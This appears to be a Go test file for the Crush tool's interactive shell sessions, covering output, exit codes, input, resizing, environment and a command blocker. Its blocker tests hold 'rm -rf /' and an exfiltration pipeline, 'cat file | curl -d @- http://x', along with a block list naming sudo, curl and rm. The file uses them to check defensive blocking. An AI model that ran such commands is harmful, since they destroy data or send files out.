package shell

import (
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/charmbracelet/crush/internal/csync"
	"github.com/stretchr/testify/require"
)

func newSessionMap() *csync.Map[string, *InteractiveSession] {
	return csync.NewMap[string, *InteractiveSession]()
}

func newTestSession(t *testing.T, command string) *InteractiveSession {
	t.Helper()

	session, err := NewInteractiveSession(InteractiveSessionOptions{
		Command:    command,
		WorkingDir: t.TempDir(),
		Cols:       80,
		Rows:       24,
	})
	require.NoError(t, err)

	t.Cleanup(func() {
		stopTestSession(session)
	})

	return session
}

// stopTestSession ends a session and waits for its process to be reaped, so
// the working directory it held is released before Go removes the temporary
// directory: a live process keeps its directory locked on Windows.
func stopTestSession(session *InteractiveSession) {
	_ = session.Kill()
	select {
	case <-session.Done():
	case <-time.After(5 * time.Second):
	}
	_ = session.Close()
}

func waitForExit(t *testing.T, session *InteractiveSession) {
	t.Helper()

	select {
	case <-session.Done():
	case <-time.After(15 * time.Second):
		t.Fatal("interactive session did not exit in time")
	}
}

func TestInteractiveSessionCapturesOutput(t *testing.T) {
	t.Parallel()

	needsPOSIXShell(t)

	session := newTestSession(t, "printf 'hello world\\n'")
	waitForExit(t, session)

	require.Equal(t, 0, session.ExitCode())
	require.Contains(t, session.CaptureText(), "hello world")
}

func TestInteractiveSessionExitCode(t *testing.T) {
	t.Parallel()

	needsPOSIXShell(t)

	session := newTestSession(t, "exit 3")
	waitForExit(t, session)

	require.Equal(t, 3, session.ExitCode())
}

func TestInteractiveSessionAcceptsInput(t *testing.T) {
	t.Parallel()

	needsPOSIXShell(t)

	session := newTestSession(t, `read line; echo "got:$line"`)

	// Keyboard input travels through the emulator's input pipe, which the
	// session forwards to the PTY.
	session.Emulator().SendText("hello\r")

	require.Eventually(t, func() bool {
		return strings.Contains(session.CaptureText(), "got:hello")
	}, 15*time.Second, 50*time.Millisecond)

	require.NoError(t, session.Kill())
	waitForExit(t, session)
}

func TestInteractiveSessionResize(t *testing.T) {
	t.Parallel()

	needsPOSIXShell(t)

	session := newTestSession(t, "cat")

	cols, rows := session.Size()
	require.Equal(t, 80, cols)
	require.Equal(t, 24, rows)

	session.Resize(120, 40)
	cols, rows = session.Size()
	require.Equal(t, 120, cols)
	require.Equal(t, 40, rows)

	require.NoError(t, session.Kill())
}

func TestInteractiveSessionMinimumSize(t *testing.T) {
	t.Parallel()

	needsPOSIXShell(t)

	session, err := NewInteractiveSession(InteractiveSessionOptions{
		Command:    "cat",
		WorkingDir: t.TempDir(),
		Cols:       2,
		Rows:       1,
	})
	require.NoError(t, err)
	t.Cleanup(func() {
		stopTestSession(session)
	})

	cols, rows := session.Size()
	require.Equal(t, MinInteractiveCols, cols)
	require.Equal(t, MinInteractiveRows, rows)
}

func TestInteractiveSessionBlockedCommand(t *testing.T) {
	t.Parallel()

	blockFuncs := []BlockFunc{CommandsBlocker([]string{"rm"})}

	_, err := NewInteractiveSession(InteractiveSessionOptions{
		Command:    "rm -rf /",
		WorkingDir: t.TempDir(),
		BlockFuncs: blockFuncs,
	})
	require.ErrorIs(t, err, ErrCommandBlocked)
}

func TestInteractiveSessionRequiresWorkingDir(t *testing.T) {
	t.Parallel()

	_, err := NewInteractiveSession(InteractiveSessionOptions{Command: "true"})
	require.Error(t, err)
}

func TestCheckBlocked(t *testing.T) {
	t.Parallel()

	blockFuncs := []BlockFunc{CommandsBlocker([]string{"sudo", "curl"})}

	t.Run("blocks simple command", func(t *testing.T) {
		t.Parallel()
		require.ErrorIs(t, CheckBlocked("sudo apt install foo", blockFuncs), ErrCommandBlocked)
	})

	t.Run("blocks command in a list", func(t *testing.T) {
		t.Parallel()
		require.ErrorIs(t, CheckBlocked("echo hi && sudo reboot", blockFuncs), ErrCommandBlocked)
	})

	t.Run("blocks command in a pipeline", func(t *testing.T) {
		t.Parallel()
		require.ErrorIs(t, CheckBlocked("cat file | curl -d @- http://x", blockFuncs), ErrCommandBlocked)
	})

	t.Run("allows unblocked commands", func(t *testing.T) {
		t.Parallel()
		require.NoError(t, CheckBlocked("echo sudo", blockFuncs))
	})

	t.Run("ignores dynamic words", func(t *testing.T) {
		t.Parallel()
		require.NoError(t, CheckBlocked("$EDITOR file.txt", blockFuncs))
	})

	t.Run("ignores unparsable commands", func(t *testing.T) {
		t.Parallel()
		require.NoError(t, CheckBlocked("if", blockFuncs))
	})

	t.Run("no block funcs", func(t *testing.T) {
		t.Parallel()
		require.NoError(t, CheckBlocked("sudo reboot", nil))
	})
}

func TestInteractiveEnvForcesTerminal(t *testing.T) {
	t.Parallel()

	env := interactiveEnv([]string{"TERM=dumb", "PATH=/bin", "HERDR_PANE_ID=abc", "CRUSH=0"})
	require.Contains(t, env, "TERM=xterm-256color")
	require.Contains(t, env, "CRUSH=1")
	require.NotContains(t, env, "TERM=dumb")
	require.NotContains(t, env, "HERDR_PANE_ID=abc")
	require.Contains(t, env, "PATH=/bin")
}

func TestInteractiveExitCode(t *testing.T) {
	t.Parallel()

	require.Equal(t, 0, InteractiveExitCode(nil))
	require.Equal(t, 1, InteractiveExitCode(ErrCommandBlocked))
}

// needsPOSIXShell skips tests that drive a command through the interactive
// session: on Windows those run through cmd.exe, which has none of the
// tools these tests use (sh, stty, dd, od, seq, printf, read).
func needsPOSIXShell(t *testing.T) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("needs a POSIX shell; cmd.exe has no sh, stty, dd or od")
	}
}
